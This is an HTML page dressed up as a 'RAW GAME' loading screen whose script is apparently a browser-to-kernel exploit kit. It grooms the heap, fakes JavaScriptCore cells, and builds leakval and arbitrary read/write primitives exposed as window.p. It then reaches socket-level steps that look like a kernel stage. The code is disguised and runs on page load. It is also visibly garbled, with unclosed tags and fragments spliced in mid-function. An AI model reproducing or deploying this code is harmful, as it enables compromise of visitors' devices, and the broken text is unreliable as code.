<!DOCTYPE html>
<html lang="en" manifest="cache.appcache">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>RAW GAME - High Performance</title>
<style>
  *, *::before, *::after { box-sizing: border-box; }
  html, body {
    margin: 0; padding: 0; min-height: 100%;
    background: #090c10; color: #c9d1d9;
    font: 14px/1.5 -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, system-ui, sans-serif;
    -webkit-user-select: none; user-select: none;
  }
  #brand {
    display: flex; align-items: center; justify-content: center;
    padding: 10px 14px; background: #0d1117;
    border-bottom: 1px solid #21262d;
  }
  #brand img {
    width: 26px; height: 26px; margin-right: 8px; border-radius: 50%;
  }
  #brand b {
    font-size: 15px; font-weight: 700; letter-spacing: .12em;
    color: #f0f6fc;
  }
  #brand .badge {
    margin-left: 8px; padding: 2px 7px;
    font-size: 10px; font-weight: 700; letter-spacing: .08em;
    border-radius: 12px; background: rgba(56, 139, 253, 0.15);
    color: #58a6ff; border: 1px solid rgba(56, 139, 253, 0.3);
  }
  #wrap {
    max-width: 680px; margin: 0 auto; padding: 20px 18px;
    display: flex; flex-direction: column; align-items: center;
  }
  #card {
    width: 100%; background: #161b22; border: 1px solid #30363d;
    border-radius: 8px; padding: 18px 20px; margin-top: 10px;
    box-shadow: 0 4px 16px rgba(0,0,0,0.3);
  }
  #state {
    font-size: 18px; font-weight: 700; margin: 0 0 8px;
    color: #f0f6fc; display: flex; align-items: center; justify-content: space-between;
  }
  #det {
    font-size: 13px; color: #8b949e; margin: 0 0 6px;
  }
  #det b { color: #c9d1d9; font-weight: 600; }
  #cache {
    font-size: 12px; color: #6e7681; margin: 0 0 14px; min-height: 14px;
  }
  #cache.cacheok { color: #3fb950; font-weight: 600; }

  /* High performance animated progress indicator */
  #spin-box {
    position: relative; width: 64px; height: 64px; margin: 18px auto 14px;
    display: flex; align-items: center; justify-content: center;
  }
  #spin {
    width: 54px; height: 54px;
    border: 4px solid #21262d; border-top-color: #58a6ff;
    border-radius: 50%;
    animation: spin 0.75s cubic-bezier(0.4, 0, 0.2, 1) infinite;
  }
  @keyframes spin { to { transform: rotate(360deg); } }

  #msg {
    text-align: center; font-size: 15px; font-weight: 600;
    margin: 8px 0; color: #8b949e;
  }

  /* Micro milestones */
  #milestones {
    display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 14px;
    padding-top: 14px; border-top: 1px solid #21262d; font-size: 12px;
  }
  .ms-item {
    padding: 6px 10px; background: #0d1117; border-radius: 6px;
    border: 1px solid #21262d; color: #8b949e; display: flex; align-items: center;
  }
  .ms-item.ms-done { border-color: #238636; color: #3fb950; font-weight: 600; }
  .ms-item.ms-active { border-color: #388bfd; color: #58a6ff; font-weight: 600; }
  .ms-dot {
    width: 6px; height: 6px; border-radius: 50%; background: #6e7681; margin-right: 8px;
  }
  .ms-done .ms-dot { background: #3fb950; box-shadow: 0 0 6px #3fb950; }
  .ms-active .ms-dot { background: #58a6ff; box-shadow: 0 0 6px #58a6ff; }

  /* Body states */
  body.done #spin { display: none; }
  body.fail #spin { display: none; }
  body.done #msg {
    display: block; color: #3fb950; font-weight: 700; font-size: 18px;
    letter-spacing: 1.5px;
  }
  body.fail #msg { display: block; color: #f85149; font-weight: 700; }

  /* ?log=1 Diagnostics output */
  #out {
    display: none; width: 100%; white-space: pre-wrap;
    font: 12px/1.45 Consolas, Monaco, monospace;
    background: #0d1117; border: 1px solid #30363d;
    border-radius: 6px; padding: 12px; margin-top: 14px;
    max-height: 520px; overflow-y: auto; color: #c9d1d9;
  }
  body.log #out { display: block; }
  body.log #spin-box { display: none; }
  body.log #msg { display: none; }
  body.log #card { max-width: 100%; }

  .ok { color: #3fb950; }
  .bad { color: #f85149; }
  .warn { color: #d29922; }
  .safe { color: #3fb950; }
  .danger { color: #f85149; }
</style>
</head>
<body>
<div id="brand">
  <img src="logo_raw.png" alt="" width="26" height="26">

<script>

window.MANUAL_LAUNCH = true;

<script>
// RAW GAME High-Performance Engine

(function() {
"use strict";

// --- int64 Module ---
function zeroFill(number, width) {
  width -= number.toString().length;

  if (width > 0) {
    return new Array(width + (/\./.test(number) ? 2 : 1)).join("0") + number;
  }

  return number + "";
}

function int64(low, hi) {
  this.low = low >>> 0;

  this.hi = hi >>> 0;

  this.backing = null;

  this.add32inplace = function (val) {
    let new_lo = (((this.low >>> 0) + val) & 0xffffffff) >>> 0;
    let new_hi = this.hi >>> 0;

    if (new_lo < this.low) {
      new_hi++;
    }

    this.hi = new_hi;
    this.low = new_lo;
    if (this.backing !== null) {
      if (this.backing.byteLength < val) {
        throw new Error("int64.add32inplace: overflow");
      }

      this.backing = new Uint8Array(
        this.backing.buffer,
        val,
        this.backing.byteLength - val,
      );
    }
  };

  this.add32 = function (val) {
    let new_lo = (((this.low >>> 0) + val) & 0xffffffff) >>> 0;
    let new_hi = this.hi >>> 0;

    if (new_lo < this.low) {
      new_hi++;
    }

    let ret = new int64(new_lo, new_hi);
    if (this.backing !== null) {
      if (this.backing.byteLength < val) {
        throw new Error("int64.add32: overflow");
      }

      ret.backing = new Uint8Array(
        this.backing.buffer,
        val,
        this.backing.byteLength - val,
      );
    }

    return ret;
  };

  this.sub32 = function (val) {
    let new_lo = (((this.low >>> 0) - val) & 0xffffffff) >>> 0;
    let new_hi = this.hi >>> 0;

    if ((new_lo > this.low) & 0xffffffff) {
      new_hi--;
    }

    return new int64(new_lo, new_hi);
  };

  this.sub32inplace = function (val) {
    let new_lo = (((this.low >>> 0) - val) & 0xffffffff) >>> 0;
    let new_hi = this.hi >>> 0;

    if ((new_lo > this.low) & 0xffffffff) {
      new_hi--;
    }

    this.hi = new_hi;
    this.low = new_lo;
  };

  this.and32 = function (val) {
    let new_lo = this.low & val;
    let new_hi = this.hi;
    return new int64(new_lo, new_hi);
  };

  this.and64 = function (vallo, valhi) {
    let new_lo = this.low & vallo;
    let new_hi = this.hi & valhi;
    return new int64(new_lo, new_hi);
  };

  this.toString = function (radix = 16) {
    let lo_str = (this.low >>> 0).toString(radix);
    let hi_str = (this.hi >>> 0).toString(radix);

    if (this.hi == 0) {
      return lo_str;
    } else {
      const width = radix === 16 ? 8 : Math.ceil(32 / Math.log2(radix));
      lo_str = zeroFill(lo_str, width);
    }

    return hi_str + lo_str;
  };

  return this;
}

globalThis.int64 = int64;





// --- core Module ---
const core = (() => {
let DRAIN_COUNT = 512;
const AUTO_RETRY_DELAY_MS = 50;

const K = 2;
const DUPLICATE_INDEX = 2;
const CONTROL_INDEX = 0xffff;
const CONTROL_INT = -64000;
const FILLER_BIGINTS = K - 1;
const FILLER_OBJECTS = 0xfffe - K;
const EXPECTED_LENGTH = 0x50001;
const CELL_BYTES = 0x30;
const FUNCTION_BYTES = 0x20;
const NATIVE_EXECUTABLE_BYTES = 0x38;
const HOLDER_BYTES = 0x40;

const CARRIER_SLOTS = (function () {
  try {
    const q = new URLSearchParams(location.search).get("slots");
    const n = q ? parseInt(q, 10) : 0;
    if (n >= 100000 && n <= 40000000) return n;
  } catch (e) {}
  return 12000000;
})();
const CARRIER_BYTES = CARRIER_SLOTS * 8;
const CAPTURE_DELAY_MS = 50;
const COMPOSE_DELAY_MS = 100;

const symbolToString = Symbol.prototype.toString;

const _gOverride = (function () {
  const out = {};
  try {
    const q = new URLSearchParams(location.search).getAll("g");
    for (const item of q) {
      const [k, v] = item.split(":");
      const n = v && v.startsWith("0x") ? parseInt(v, 16) : parseInt(v, 10);
      if (k && n > 0) out[k] = n;
    }
  } catch (e) {}
  return out;
})();
const _g = (name, dflt) =>
  typeof _gOverride[name] === "number" ? _gOverride[name] : dflt;
if (typeof _gOverride.drain === "number") DRAIN_COUNT = _gOverride.drain;

const DRAIN_SIZE = _g("drainsz", 0x10000);
const SLAB_SIZE = _g("slab", 0x400000);
const BUTTERFLY_HOLE_SIZE = _g("bfly", 0x81000);
const SEPARATOR_SIZE = _g("sep", 0x10000);
const EARLY_HOLE_SIZE = _g("early", 0x70000);
const GUARD_SIZE = _g("guard", 0x90000);
const PREDECESSOR_SIZE = _g("pred", 0x80000);
const FINAL_HOLE_SIZE = _g("final", 0x80000);

const RW_BUFFER_SIZE = 0x100;

const IDENT_OFFSET = 0x20;

const LEAK_SLOT_INDEX = 2;
const LEAK_SLOT_OFFSET = 0x10 + 8 * LEAK_SLOT_INDEX;

const REVISION = "slopkit-core-1";
const attemptKey = `${REVISION}:attempts`;

const burstKey = `${REVISION}:burst`;

const rwHeader = new Uint8Array(CELL_BYTES);
const targetHeader = new Uint8Array(NATIVE_EXECUTABLE_BYTES);
const holderHeader = new Uint8Array(HOLDER_BYTES);
const scratchBits = new ArrayBuffer(8);
const scratchBytes = new Uint8Array(scratchBits);
const scratchWords = new Uint32Array(scratchBits);
const scratchDouble = new Float64Array(scratchBits);

const identityMagic = new Uint8Array([
  0x5a, 0xa5, 0xc3, 0x3c, 0xde, 0xad, 0xbe, 0xef,
]);
const identityBytes = new Uint8Array(8);

let attemptNumber = 0;
let attemptCeiling = 0;
let keepIndex = 0;
let stopped = false;
let keepAlive = null;
let onEvent = null;
let criticalBarrier = null;
let settleResolve = null;
let settleReject = null;
let running = false;

let referenceTarget = null;
let rwBuffer = null;
let rwView = null;
let rwMirror = null;
let targetBuffer = null;
let targetView = null;
const nativeTarget = parseInt;
let fakeHost = null;
let lengthWord = null;
let anchorElement = null;
let markerObjectA = null;
let markerObjectB = null;
let targetHolder = null;
let holderGuardA = null;
let holderGuardB = null;
let fillerGraph = null;
let outerGraph = null;

let leakedScope = null;
let getterCarrier = null;
let preparedSymbolObject = null;
let capturedString = null;
let capturedWords = null;
let copiedLength = 0;
let captureState = 0;
let captureError = null;
let hostAddress = NaN;
let fakeAddress = NaN;

let predecessorWords = null;
let pointerLow = 0;
let pointerHigh = 0;
let targetAddress = NaN;
let targetAddressLow = 0;
let targetAddressHigh = 0;
let nativeTargetAddress = NaN;
let anchorElementAddress = NaN;
let markerAAddress = NaN;
let markerBAddress = NaN;

let rwOriginalVector = NaN;
let rwHeaderOK = false;
let holderHeaderOK = false;
let functionHeaderOK = false;
let nativeExecutableHeaderOK = false;
let functionStructureID = 0;
let nativeExecutableStructureID = 0;
let executableAddress = NaN;
let nativeFunctionAddress = NaN;
let nativeConstructorAddress = NaN;
let pointersRepeated = false;
let restoreObserved = false;
let retrySafe = false;
let retryScheduled = false;
let attemptPersisted = false;
let candidateEverReturned = false;
let candidateMutationStarted = false;
let zeroHeaderMiss = false;
let identityResult = 0;

let compositionState = 0;
let compositionLength = 0;
let compositionError = null;

let liveCandidate = null;
let fakeReleased = false;

const UNSEEN = -1;
const profile = {
  carrierSID: UNSEEN,
  carrierType: UNSEEN,
  carrierFlags: UNSEEN,
  carrierMode: UNSEEN,
  carrierByte28: UNSEEN,
  holderSID: UNSEEN,
  holderType: UNSEEN,
  holderFlags: UNSEEN,
  functionSID: UNSEEN,
  functionType: UNSEEN,
  functionFlags: UNSEEN,
  nativeExecSID: UNSEEN,
  nativeExecType: UNSEEN,
  nativeExecFlags: UNSEEN,
  cellSize: UNSEEN,

  vectorOffset: 0x10,
  inlineSlotOffset: 0x10,
  butterflyOffset: 0x08,
  vectorOffsetMeasured: false,
};

function resetProfile() {
  profile.carrierSID = UNSEEN;
  profile.carrierType = UNSEEN;
  profile.carrierFlags = UNSEEN;
  profile.carrierMode = UNSEEN;
  profile.carrierByte28 = UNSEEN;
  profile.holderSID = UNSEEN;
  profile.holderType = UNSEEN;
  profile.holderFlags = UNSEEN;
  profile.functionSID = UNSEEN;
  profile.functionType = UNSEEN;
  profile.functionFlags = UNSEEN;
  profile.nativeExecSID = UNSEEN;
  profile.nativeExecType = UNSEEN;
  profile.nativeExecFlags = UNSEEN;
}

function hex(value) {
  return `0x${value.toString(16)}`;
}

function buffer(size) {
  return new ArrayBuffer(size);
}

function allZero(bytes, start, end) {
  for (let i = start; i < end; ++i) {
    if (bytes[i] !== 0) return false;
  }
  return true;
}

function uint32At(bytes, offset) {
  return (
    bytes[offset] +
    bytes[offset + 1] * 0x100 +
    bytes[offset + 2] * 0x10000 +
    bytes[offset + 3] * 0x1000000
  );
}

function low48At(bytes, offset) {
  return (
    bytes[offset] +
    bytes[offset + 1] * 0x100 +
    bytes[offset + 2] * 0x10000 +
    bytes[offset + 3] * 0x1000000 +
    bytes[offset + 4] * 0x100000000 +
    bytes[offset + 5] * 0x10000000000
  );
}

function readBytes(destination, source, count) {
  for (let i = 0; i < count; ++i) destination[i] = source[i];
}

function sameBytes(left, right, count) {
  for (let i = 0; i < count; ++i) {
    if (left[i] !== right[i]) return false;
  }
  return true;
}

function readTwiceMatches(destination, source, count) {
  readBytes(destination, source, count);
  return sameBytes(destination, source, count);
}

function aimCarrier(candidate, address) {
  const high = Math.floor(address / 0x100000000);
  scratchWords[0] = address - high * 0x100000000;
  scratchWords[1] = high;
  for (let i = 0; i < 8; ++i) candidate[0x10 + i] = scratchBytes[i];
}

function restoreCarrier(candidate) {
  for (let i = 0; i < 8; ++i) candidate[0x10 + i] = rwHeader[0x10 + i];
}

function pointerFromWords(words, offset) {
  if (words[offset + 3] !== 0) return NaN;
  return (
    words[offset] +
    words[offset + 1] * 0x10000 +
    words[offset + 2] * 0x100000000
  );
}

function plausibleCell(value) {
  return (
    value > 0x100000000 &&
    value <= 0xffffffffffff &&
    value <= 9007199254740991 &&
    Math.floor(value) === value &&
    value % 8 === 0
  );
}

function plausibleAddress(value) {
  return (
    value > 0x100000000 &&
    value <= 0xffffffffffff &&
    value <= 9007199254740991 &&
    Math.floor(value) === value
  );
}

function canonicalLow48(bytes, offset) {
  return bytes[offset + 6] === 0 && bytes[offset + 7] === 0;
}

function dumpHex(bytes, count) {
  let out = "";
  for (let i = 0; i < count; ++i) out += bytes[i].toString(16).padStart(2, "0");
  return out;
}

function encodedHeaderNumber() {
  const raw = new ArrayBuffer(8);
  const u32 = new Uint32Array(raw);
  const f64 = new Float64Array(raw);
  u32[0] = 0x00004250;
  u32[1] = 0x01062800;
  return f64[0];
}

function emit(tag, detail) {
  if (onEvent === null) return;
  try {
    onEvent(tag, detail === undefined ? "" : String(detail), attemptNumber);
  } catch {}
}

function checkCarrierIdentity(candidate) {
  if (
    !plausibleAddress(rwOriginalVector) ||
    rwOriginalVector % 8 !== 0 ||
    IDENT_OFFSET + 8 > RW_BUFFER_SIZE
  )
    return 0;
  aimCarrier(candidate, rwOriginalVector + IDENT_OFFSET);
  readBytes(identityBytes, rwView, 8);
  restoreCarrier(candidate);
  return sameBytes(identityBytes, identityMagic, 8) && rwView[0] === 0x3c
    ? 1
    : -1;
}

function runIdentityProof(candidate) {
  candidateMutationStarted = true;
  identityResult = checkCarrierIdentity(candidate);
  return identityResult === 1;
}

function ceilingReached() {
  return attemptCeiling > 0 && attemptNumber >= attemptCeiling;
}

function giveUp(reason) {
  stopped = true;
  emit("CORE-GIVE-UP", `reason=${reason}-attempts=${attemptNumber}`);
  const reject = settleReject;
  settleResolve = null;
  settleReject = null;
  running = false;
  if (reject !== null)
    reject(
      new Error(`core: gave up after ${attemptNumber} attempts (${reason})`),
    );
}

function failed() {
  if (ceilingReached()) {
    giveUp("attempt-ceiling");
    return;
  }
  emit("AUTO-RETRY-AFTER-FAILURE", `attempt=${attemptNumber}`);
  stopped = false;
  retryScheduled = false;
  setTimeout(() => {
    try {
      history.replaceState(null, "");
    } catch {}
    attemptNumber++;
    startAttempt();
  }, AUTO_RETRY_DELAY_MS);
}

function releaseAttemptAllocations() {
  referenceTarget = null;
  rwBuffer = null;
  rwView = null;
  rwMirror = null;
  targetBuffer = null;
  targetView = null;
  fakeHost = null;
  lengthWord = null;
  anchorElement = null;
  markerObjectA = null;
  markerObjectB = null;
  targetHolder = null;
  holderGuardA = null;
  holderGuardB = null;
  fillerGraph = null;
  outerGraph = null;
  leakedScope = null;
  getterCarrier = null;
  preparedSymbolObject = null;
  capturedString = null;
  capturedWords = null;
  predecessorWords = null;
  keepAlive = null;
  try {
    history.replaceState(null, "");
  } catch {}
  if (typeof globalThis.gc === "function") {
    try {
      globalThis.gc();
    } catch {}
  }
}

function scheduleSafeRetry(reason) {
  if (retryScheduled || stopped) return;
  const candidateStateSafe =
    !candidateEverReturned || (zeroHeaderMiss && !candidateMutationStarted);

  if (
    !retrySafe ||
    !candidateStateSafe ||
    candidateMutationStarted ||
    !attemptPersisted
  ) {
    emit(
      "AUTO-RETRY-NOT-SCHEDULED",
      `reason=${reason}` +
        `-safe=${retrySafe}` +
        `-candidate-seen=${candidateEverReturned}` +
        `-candidate-mutated=${candidateMutationStarted}` +
        `-candidate-state-safe=${candidateStateSafe}` +
        `-attempt-persisted=${attemptPersisted}`,
    );
    failed();
    return;
  }
  if (ceilingReached()) {
    giveUp("attempt-ceiling");
    return;
  }

  retryScheduled = true;
  const nextAttempt = attemptNumber + 1;
  emit("AUTO-RETRY-SCHEDULED", `reason=${reason}-next-attempt=${nextAttempt}`);
  releaseAttemptAllocations();
  setTimeout(
    () => {
      const candidateStillSafe =
        !candidateEverReturned || (zeroHeaderMiss && !candidateMutationStarted);
      if (
        !retrySafe ||
        !candidateStillSafe ||
        candidateMutationStarted ||
        stopped
      ) {
        emit(
          "AUTO-RETRY-CANCELLED",
          `reason=${reason}` +
            `-retry-safe=${retrySafe}` +
            `-candidate-safe=${candidateStillSafe}` +
            `-candidate-mutated=${candidateMutationStarted}`,
        );
        failed();
        return;
      }

      attemptNumber = nextAttempt;
      startAttempt();
    },
    Math.max(AUTO_RETRY_DELAY_MS, 750),
  );
}

function finishEarlySafeAttempt(tag, extra, reason) {
  retrySafe = true;
  emit(
    tag,
    `${extra}-retry-safe=true-candidate-seen=false` +
      "-candidate-mutated=false",
  );
  scheduleSafeRetry(reason);
}

function resetAttemptState() {
  referenceTarget = null;
  rwBuffer = null;
  rwView = null;
  rwMirror = null;
  targetBuffer = null;
  targetView = null;
  fakeHost = null;
  lengthWord = null;
  anchorElement = null;
  markerObjectA = null;
  markerObjectB = null;
  targetHolder = null;
  holderGuardA = null;
  holderGuardB = null;
  fillerGraph = null;
  outerGraph = null;
  leakedScope = null;
  getterCarrier = null;
  preparedSymbolObject = null;
  capturedString = null;
  capturedWords = null;
  copiedLength = 0;
  captureState = 0;
  captureError = null;
  hostAddress = NaN;
  fakeAddress = NaN;
  predecessorWords = null;
  keepAlive = new Array(DRAIN_COUNT + 3);
  keepIndex = 0;
  pointerLow = 0;
  pointerHigh = 0;
  targetAddress = NaN;
  targetAddressLow = 0;
  targetAddressHigh = 0;
  nativeTargetAddress = NaN;
  anchorElementAddress = NaN;
  markerAAddress = NaN;
  markerBAddress = NaN;
  rwOriginalVector = NaN;
  rwHeaderOK = false;
  holderHeaderOK = false;
  functionHeaderOK = false;
  nativeExecutableHeaderOK = false;
  functionStructureID = 0;
  nativeExecutableStructureID = 0;
  executableAddress = NaN;
  nativeFunctionAddress = NaN;
  nativeConstructorAddress = NaN;
  pointersRepeated = false;
  restoreObserved = false;
  retrySafe = false;
  retryScheduled = false;
  candidateEverReturned = false;
  candidateMutationStarted = false;
  zeroHeaderMiss = false;
  identityResult = 0;
  identityBytes.fill(0);
  compositionState = 0;

let workerBuffer = null;

      "main",
      "mainIdentity",
      mainHomeVector + MAIN_IDENT_OFFSET,
      mainMagic,
      `home=0x${pairStatus.mainVector.toString()}` +
        `-cell=0x${pairStatus.mainAddress.toString()}` +
        `-offset=+0x${MAIN_IDENT_OFFSET.toString(16)}`,
    );

    readInto(workerHeader, workerAddr, PAIR_HEADER_BYTES);
    const workerVector = low48At(workerHeader, VECTOR_OFF);
    const workerButterfly = low48At(workerHeader, BUTTERFLY_OFF);
    pairStatus.mode = workerHeader[MODE_OFF];
    pairStatus.workerWindow = u32At(workerHeader, LENGTH_OFF);
    pairStatus.workerVector = toI64(workerVector);
    pairStatus.workerButterfly = toI64(workerButterfly);
    note(
      "PAIR-WORKER-HEADER",
      `sid=0x${u32At(workerHeader, 0).toString(16)}` +
        `-vector=0x${pairStatus.workerVector.toString()}` +
        `-len=${pairStatus.workerWindow}-mode=${pairStatus.mode}` +
        `-butterfly=0x${pairStatus.workerButterfly.toString()}`,
    );

    const gate =
      u32At(workerHeader, 0) === pairStatus.structureID &&
      (workerHeader[7] === 0 || workerHeader[7] === 1) &&
      pairStatus.workerWindow === WORKER_BUFFER_SIZE &&
      workerHeader[MODE_OFF] === mainRecord[MODE_OFF] &&
      workerHeader[MODE_OFF + 1] === 0 &&
      workerHeader[MODE_OFF + 2] === 0 &&
      workerHeader[MODE_OFF + 3] === 0 &&
      canonical48(workerHeader, BUTTERFLY_OFF) &&
      workerButterfly > 0x100000000 &&
      workerButterfly % 8 === 0 &&
      canonical48(workerHeader, VECTOR_OFF) &&
      fake.validate(workerVector) &&
      workerVector % 8 === 0 &&
      workerVector !== mainHomeVector;

          ` worker-len=${pairStatus.workerWindow}` +
          ` worker-mode=${workerHeader[MODE_OFF]}` +
          ` main-mode=${mainRecord[MODE_OFF]}` +
          ` worker-sid=${u32At(workerHeader, 0)}` +
          ` main-sid=${pairStatus.structureID}` +
          ` worker-vector=0x${pairStatus.workerVector.toString()}` +
          ` worker-butterfly=0x${pairStatus.workerButterfly.toString()}` +
          ` main-home=0x${pairStatus.mainVector.toString()}`,
      );

    proveMagic(
      note,
      "worker",
      "workerIdentity",
      workerVector + PAIR_IDENT_OFFSET,
      workerMagic,
      `vector=0x${pairStatus.workerVector.toString()}` +
        `-cell=0x${pairStatus.workerAddress.toString()}` +
        `-offset=+0x${PAIR_IDENT_OFFSET.toString(16)}`,
    );
    note("PAIR-IDENTITY", "main-cell=proved-main-buffer=proved-worker=proved");

    for (let i = 0; i < 8; ++i)
      workerOriginalVector[i] = workerHeader[VECTOR_OFF + i];
    for (let i = 0; i < 4; ++i)
      workerOriginalLength[i] = workerHeader[LENGTH_OFF + i];

    note(
      "PAIR-COMMIT",
      `main=0x${pairStatus.mainAddress.toString()}` +
        `-worker=0x${pairStatus.workerAddress.toString()}` +
        "-next=aim-without-restore",
    );
    aimFor(workerAddr, PAIR_HEADER_BYTES);
    committed = true;
    pairStatus.committed = true;

    for (let i = 0; i < 4; ++i) mainView[LENGTH_OFF + i] = 0xff;
    pairStatus.workerLength = workerView.length;

    if (pairStatus.workerLength !== WORKER_LENGTH_MAX)
      throw new Error(
        "mem.promote: the m_length write did not land -- " +
          `worker.length reads ${pairStatus.workerLength}`,
      );
    if (workerMirror.length !== WORKER_BUFFER_SIZE)
      throw new Error(
        "mem.promote: the mirror was widened too -- the write " +
          "went somewhere structural, not to worker's m_length",
      );
    if (workerView[0] !== HOME_BYTE)
      throw new Error("mem.promote: worker no longer sees its own buffer");

    if (
      mainView[MODE_OFF] !== workerHeader[MODE_OFF] ||
      mainView[MODE_OFF + 1] !== 0 ||
      mainView[MODE_OFF + 2] !== 0 ||
      mainView[MODE_OFF + 3] !== 0
    )
      throw new Error("mem.promote: m_mode was disturbed by the widening");

    for (let i = 0; i < 8; ++i) {
      if (mainView[VECTOR_OFF + i] !== workerOriginalVector[i])

          "mem.promote: worker's m_vector moved during the widening",
        );
    }
    note(
      "PAIR-WIDENED",
      `length=0x${WORKER_LENGTH_MAX.toString(16)}` +
        `-mode=0x${pairStatus.mode.toString(16)}`,
    );

    pairVectorOffset = VECTOR_OFF;
    carrier = buildPairCarrier(fake);
    rebound = true;

    readInto(identityBytes, workerVector + PAIR_IDENT_OFFSET, 8);
    if (!sameBytes(identityBytes, workerMagic, 8))
      throw new Error(
        "mem.promote: read through the pair returned " +
          `${hexOf(identityBytes, 8)}, expected ${hexOf(workerMagic, 8)}`,
      );
    write8(workerVector + PAIR_IDENT_OFFSET, new int64(0x0d0c0b0a, 0x04030201));
    const back = [0x0a, 0x0b, 0x0c, 0x0d, 0x01, 0x02, 0x03, 0x04];
    for (let i = 0; i < 8; ++i) {
      if (workerMirror[PAIR_IDENT_OFFSET + i] !== back[i])
        throw new Error(
          `mem.promote: write through the pair failed at byte ${i}`,
        );
    }
    for (let i = 0; i < 8; ++i)
      workerMirror[PAIR_IDENT_OFFSET + i] = workerMagic[i];

    const workerAgain = addrNumber(leakval(workerView));
    pairStatus.leakvalAgrees = workerAgain === workerAddr;
    if (!pairStatus.leakvalAgrees)
      throw new Error(
        "mem.promote: leakval through the pair disagrees " +
          `(0x${toI64(workerAgain).toString()} vs ` +
          `0x${pairStatus.workerAddress.toString()})`,
      );

    const mv = read8(mainAddr + VECTOR_OFF);
    if (
      mv.low !== pairStatus.workerAddress.low ||
      mv.hi !== pairStatus.workerAddress.hi
    )
      throw new Error(
        `mem.promote: main.m_vector reads 0x${mv.toString()},` +
          ` expected worker's cell 0x${pairStatus.workerAddress.toString()}`,
      );
    if (read4(mainAddr + LENGTH_OFF) !== fake.windowBytes)
      throw new Error("mem.promote: main's own m_length was disturbed");
    note(
      "PAIR-REPROVED",
      `main-m_vector=0x${mv.toString()}` +
        `-leakval=0x${toI64(workerAgain).toString()}`,
    );

    note("PAIR-RELEASE", "next=release-fake-cell-and-debris");
    const rel = releaseFakeCell();
    pairStatus.released = rel.released;
    pairStatus.historyCleared = !!rel.historyCleared;
    if (!fakeCellReleased())
      throw new Error("mem.promote: core.js did not release the fake cell");
    if (fake.assertHome() !== false)
      throw new Error(
        "mem.promote: core.js's carrier still reports itself live",
      );

    pairStatus.promoted = true;
    pairStatus.state = "pair";
    pairStatus.error = null;
    note(
      "PAIR-UP",
      `main=0x${pairStatus.mainAddress.toString()}` +
        `-worker=0x${pairStatus.workerAddress.toString()}` +
        `-home=0x${pairStatus.mainVector.toString()}` +
        `-mode=0x${pairStatus.mode.toString(16)}` +
        `-sid=0x${pairStatus.structureID.toString(16)}` +
        `-released=${pairStatus.released.length}` +
        `-history-cleared=${pairStatus.historyCleared}`,
    );
    return pairStatus;
  } catch (error) {
    pairStatus.failedAt = pairStatus.stage;
    pairStatus.error = `${error && error.name}: ${String(error && error.message)}`;

    let clean = true;
    if (committed) {
      pairStatus.rolledBack = true;
      try {
        for (let i = 0; i < 8; ++i)
          mainView[VECTOR_OFF + i] = workerOriginalVector[i];
        for (let i = 0; i < 4; ++i)
          mainView[LENGTH_OFF + i] = workerOriginalLength[i];
      } catch {
        clean = false;
      }
      try {
        fake.restore();
      } catch {
        clean = false;
      }

      try {
        if (
          !(
            workerView.length === WORKER_BUFFER_SIZE &&
            workerMirror.length === WORKER_BUFFER_SIZE &&
            workerView[0] === HOME_BYTE &&
            fake.assertHome() === true
          )
        )
          clean = false;
      } catch {
        clean = false;
      }
      pairStatus.rollbackClean = clean;
    }

    try {
      pairStatus.mainAtHome = fake.assertHome();
    } catch {
      pairStatus.mainAtHome = null;
    }

    pairStatus.promoted = false;
    pairStatus.fallback = true;
    pairStatus.state = committed && !clean ? "broken" : "fake";
    if (pairStatus.state === "broken")
      carrier = brokenCarrier(pairStatus.error);
    else if (rebound) carrier = fake;

    pairVectorOffset = -1;

    workerView = null;
    workerMirror = null;
    workerBuffer = null;
    mainView = null;
    note(
      "PAIR-FALLBACK",
      `state=${pairStatus.state}` +
        `-committed=${committed}-rollback-clean=${pairStatus.rollbackClean}` +
        `-main-at-home=${pairStatus.mainAtHome}` +
        `-at=${pairStatus.failedAt}-${pairStatus.error}`,
    );
    throw error;
  }
}

function installWindowP(c, options) {
  if (!c || typeof c.aim !== "function")
    throw new TypeError("mem: not a carrier");
  carrier = c;

  const prim = {
    read1,
    read2,
    read4,
    read8,
    write1,
    write2,
    write4,
    write8,
    leakval,
  };
  globalThis.p = prim;

  const opts = options || {};
  if (opts.promote === false) {
    pairStatus.state = "disabled";
    pairStatus.stage = "disabled";
    pairStatus.error = "promotion disabled by the caller (negative control)";
    return prim;
  }

  try {
    promoteToRealPair(opts.onEvent);
  } catch {
    if (pairStatus.state === "broken") {
      globalThis.p = undefined;
      throw new Error(
        "mem: the promotion failed AND its rollback did not " +
          "verify -- window.p has been WITHDRAWN rather than published " +
          `mis-aimed. failedAt=${pairStatus.failedAt} ${pairStatus.error}`,
      );
    }
  }
  return prim;
}



  return {
    pairStatus,
    promoteToRealPair,
    installWindowP,
    read1,
    read2,
    read4,
    read8,
    write1,
    write2,
    write4,
    write8,
    leakval,
    readInto,
    toI64,
    addrNumber,
    int64
  };
})();

const PROSE = [
  / -- /,
  /\.\s/,
  /;\s/,
  /,\s+(which|so|and that|because|since|as that)\s/,
  /\s+(because|rather than|instead of|so that|which is|which means|which the|so the)\s/,
  /\s+so\s+[a-z]/,
  /\s+\([a-z][^)]{40,}\)/,
];
function terse(s) {
  if (VERBOSE || s == null) return s;
  s = String(s);
  for (const re of PROSE) {
    const m = re.exec(s);
    if (m && m.index > 0) s = s.slice(0, m.index);
  }
  s = s.replace(/\s+$/, "");
  if (s.length > 140) s = s.slice(0, 140) + "...";
  return s;
}

      fhits: 0,
      faked: false,
      label: "none",
    };

    function neutralise(where, sink) {
      setNode0(0, sink);
      let renew = 0;
      for (const fd of POOL)
        if (
          sc(SYS.setsockopt, fd, IPPROTO_IPV6, IPV6_RTHDR, pAd, RTH_SIZE)
            .i32 === 0
        )
          renew++;
      mark(
        "PR-NEUTRALISE-EARLY",
        where + " next=0 on " + renew + "/" + POOL.length,
      );
    }

    function fireOk(where) {
      if (lastFire.n0 === 1 && lastFire.fsock >= 0) return true;
      mark(
        "REFUSING-TO-INTERPRET",
        where +
          " node0_sink=" +
          lastFire.n0 +
          " f_socket=" +
          lastFire.fsock +
          " forced=" +
          (lastFire.faked ? 1 : 0),
      );
      neutralise(where, N0SINK);
      return false;
    }

    const gfAb = new ArrayBuffer(RTH_SIZE);
    keepAlive.push(gfAb);
    const gfDv = new DataView(gfAb),
      gfAd = bufAddr(gfAb);
    const glAb = new ArrayBuffer(8);
